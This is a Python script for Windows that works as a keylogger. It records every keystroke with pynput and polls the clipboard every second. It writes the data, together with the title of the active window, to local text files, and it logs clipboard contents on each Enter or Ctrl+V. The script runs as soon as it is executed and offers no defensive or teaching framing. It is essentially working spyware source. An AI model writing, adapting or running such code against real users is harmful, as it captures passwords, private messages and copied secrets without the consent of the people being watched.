import ctypes
import logging
import threading
import os
import win32gui
import win32clipboard
from pynput.keyboard import Key, Listener
from time import sleep, localtime, strftime, time


def win_main():
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()

    with Listener(on_press=press)as listener:
        listener.join()

def press(key):
    start = time()
    global last_keys
    if key == Key.enter:
        #with open("enter.txt", "a")as file:
            #file.write(strftime("%Y:%m:%d %H:%M:%S", localtime()) + "\t" + get_current_windows() + "\t" + "".join(str(last_keys)) + "\n")
        enter_logger.info(get_current_windows() + "\t\t" + get_clipboard_data())
    else:
        try:
            if last_keys[-1] == Key.ctrl_l and key.char == 'v':
                with open("paste.txt", "a")as file:
                    file.write(strftime("%Y:%m:%d %H:%M:%S", localtime()) + "\t\t" + get_current_windows() + "\t\t" + get_clipboard_data() + "\n")
        except (AttributeError, IndexError):
            pass
    all_logger.info(key)
    if  len(last_keys) > 50:
        last_keys.clear()
    last_keys.append(key)
    #print(last_key)
    end = time()
    print(end - start)

def setup_logger(title, path, formatter="%(name)s:%(asctime)s:%(message)s", level=logging.INFO):
    formatter = logging.Formatter(formatter)

    handler = logging.FileHandler(path)
    handler.setFormatter(formatter)

    logger = logging.getLogger(title)
    logger.setLevel(level)
    logger.addHandler(handler)
    return logger

def get_current_windows():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def get_clipboard_data():
    try:
        win32clipboard.OpenClipboard()
        data = None
        try:
            data = win32clipboard.GetClipboardData()
        except TypeError:
            pass
        finally:
            win32clipboard.CloseClipboard()
        return data
    except:
        pass

def monitor_clipboard():
    data = None
    while True:
        if data != get_clipboard_data():
            data = get_clipboard_data()
            clipboard_logger.info(data + "" + get_current_windows())
        sleep(1)


last_keys = []
path = "test.txt"
all_logger = setup_logger("all", path)
clipboard_logger = setup_logger("clipboard", "copy.txt", formatter="%(asctime)s:\t" + "\t\t" + "Copy data: %(message)s")

enter_logger = setup_logger("enter", "enter.txt", formatter=strftime("%Y:%m:%d %H:%M:%S", localtime()) + "\t\t" + "%(message)s" + "\n")

win_main()

